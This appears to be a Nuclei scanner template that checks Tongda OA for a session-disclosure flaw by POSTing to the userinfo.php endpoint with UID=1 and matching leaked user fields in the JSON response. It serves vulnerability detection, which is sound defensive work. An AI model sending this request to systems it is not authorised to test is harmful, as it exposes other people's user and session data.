id: tongda-session-disclosure

info:
  name: 通达OA(Tongda) - Session泄露漏洞
  author: wintry
  severity: medium
  reference:
    - https://mp.weixin.qq.com/s/llyGEBRo0t-C7xOLMDYfFQ
  tags: tongda
  metadata:
    max-request: 1

http:
  - method: POST
    path:
      - "{{BaseURL}}/general/userinfo.php?UID=1"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"dept_name":"'
          - '"online_flag":'
        condition: and

      - type: word
        part: header
        words:
          - "application/json"
        condition: and

      - type: status
        status:
          - 200
